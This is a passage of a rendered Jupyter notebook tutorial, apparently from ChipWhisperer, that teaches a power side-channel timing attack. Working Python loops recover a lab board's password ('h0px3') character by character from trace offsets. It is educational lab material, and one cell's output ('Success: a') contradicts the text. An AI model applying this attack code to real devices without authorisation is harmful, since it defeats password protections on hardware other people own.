LG/AAAAAACAwL8AAAAAAACmvwAAAAAAAIg/AAAAAAAAwL8AAAAAAIDDvw==","dtype":"float64","shape":[800]}},"selected":{"id":"1162","type":"Selection"},"selection_policy":{"id":"1161","type":"UnionRenderers"}},"id":"1136","type":"ColumnDataSource"},{"attributes":{"text":""},"id":"1155","type":"Title"},{"attributes":{"callback":null},"id":"1103","type":"DataRange1d"},{"attributes":{},"id":"1158","type":"BasicTickFormatter"},{"attributes":{},"id":"1162","type":"Selection"},{"attributes":{},"id":"1161","type":"UnionRenderers"},{"attributes":{},"id":"1163","type":"UnionRenderers"},{"attributes":{"line_color":"red","x":{"field":"x"},"y":{"field":"y"}},"id":"1142","type":"Line"},{"attributes":{},"id":"1160","type":"BasicTickFormatter"},{"attributes":{"bottom_units":"screen","fill_alpha":{"value":0.5},"fill_color":{"value":"lightgrey"},"left_units":"screen","level":"overlay","line_alpha":{"value":1.0},"line_color":{"value":"black"},"line_dash":[4,4],"line_width":{"value":2},"render_mode":"css","right_units":"screen","top_units":"screen"},"id":"1165","type":"BoxAnnotation"},{"attributes":{"ticker":{"id":"1112","type":"BasicTicker"}},"id":"1115","type":"Grid"},{"attributes":{"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1137","type":"Line"},{"attributes":{},"id":"1164","type":"Selection"},{"attributes":{"callback":null},"id":"1105","type":"DataRange1d"},{"attributes":{"formatter":{"id":"1158","type":"BasicTickFormatter"},"ticker":{"id":"1112","type":"BasicTicker"}},"id":"1111","type":"LinearAxis"},{"attributes":{},"id":"1112","type":"BasicTicker"},{"attributes":{"formatter":{"id":"1160","type":"BasicTickFormatter"},"ticker":{"id":"1117","type":"BasicTicker"}},"id":"1116","type":"LinearAxis"},{"attributes":{"dimension":1,"ticker":{"id":"1117","type":"BasicTicker"}},"id":"1120","type":"Grid"}],"root_ids":["1102"]},"title":"Bokeh Application","version":"1.2.0"}};
      var render_items = [{"docid":"e511d739-f85e-4bd4-95b5-3d6117174e55","roots":{"1102":"0248e654-57a0-496b-9a3d-9a59941744e3"}}];
      root.Bokeh.embed.embed_items_notebook(docs_json, render_items);
    
      }
      if (root.Bokeh !== undefined) {
        embed_document(root);
      } else {
        var attempts = 0;
        var timer = setInterval(function(root) {
          if (root.Bokeh !== undefined) {
            embed_document(root);
            clearInterval(timer);
          }
          attempts++;
          if (attempts > 100) {
            console.log("Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing");
            clearInterval(timer);
          }
        }, 10, root)
      }
    })(window);
    </script>
    </div>

You should see both traces start and end similarly, but differ
elsewhere. If you look closely, you should see that the blue trace looks
a lot like the red trace but shifted later in time. We'll use this
timing difference to break the password!

Edit the above block to try different passwords and see how it changes
for different lengths and number of correct characters.

Go back to the original guesses (``"\n"`` and ``"h\n"``) and find some
distinct spikes that get shifted in time. Your target may differ, but in
my case, there were some distinct spikes of about -0.21 at 217 in red
and 253 in blue. The plot is interactive, so you can zoom in and move
around using the buttons on the right side of the plot. Record their
locations, value, and the difference in location (in my case, 217, 253,
-0.21, and 36).

Attacking a Single Letter
-------------------------

Now that we've located a distinctive timing difference, we can start
building our attack. We'll start with a single letter, since that will
quickly give us some feedback on the attack.

The plan for the attack is simple: keep guessing letters until we no
longer see the distinctive spike in the original location. To do this,
we'll create a loop that: \* Figures out our next guess \* Does the
capture and records the trace \* Checks if sample 217 is larger than
-0.2 (replace with appropriate values)

The below loop finds the first correct character, prints it, then ends.
You should see "Success: h" after a while.


**In [15]:**

.. code:: ipython3

    trylist = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""
    for c in trylist:
        next_pass = password + c + "\n"
        trace = cap_pass_trace(next_pass)
        if trace[121] > -0.3:
            print("Success: " + c)
            break


**Out [15]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success: a
    


Attacking the Full Password
---------------------------

Now that we can guess a single character, attacking the rest is easy; we
just need to repeat the process in another loop, move the check point
(this is the change is location you recorded earlier), and update our
guess with the new correct letter.

After updating the below script and running it, you should see parts of
the password printed out as each letter is found.


**In [16]:**

.. code:: ipython3

    trylist = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""
    def checkpass(trace, i):
        if PLATFORM == "CWNANO":
            #There's a bit of jitter
            return (trace[228 + 11*i] < 3 and trace[227 + 11*i] < 0.3)
        elif PLATFORM == "CWLITEARM" or PLATFORM == "CW308_STM32F3":
            return trace[229 + 36*i] > -0.2
        elif PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
            return trace[121 + 72 * i] > -0.3
    
    for i in range(5):
        for c in trylist:
            next_pass = password + c + "\n"
            trace = cap_pass_trace(next_pass)
            if checkpass(trace, i):
                password += c
                print("Success, pass now {}".format(password))
                break


**Out [16]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h
    




.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h0
    




.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h0p
    




.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h0px
    




.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h0px3
    


That's it! You should have successfully cracked a password using the
timing attack. Some notes on this method: \* The target device has a
finite start-up time, which slows down the attack. If you wish, remove
some of the ``printf()``'s from the target code, recompile and
reprogram, and see how quickly you can do this attack. \* The current
script doesn't look for the "WELCOME" message when the password is OK.
That is an extension that allows it to crack any size password. \* If
there was a lock-out on a wrong password, the system would ignore it, as
it resets the target after every attempt.

Conclusion
----------

This tutorial has demonstrated the use of the power side-channel for
performing timing attacks. A target with a simple password-based
security system is broken.


**In [17]:**

.. code:: ipython3

    scope.dis()
    target.dis()

Tests
-----


**In [18]:**

.. code:: ipython3

    assert (password == "h0px3"), "Failed to break password, got {}.\nIf on Nano, may need to rerun".format(password)


**In [ ]:**

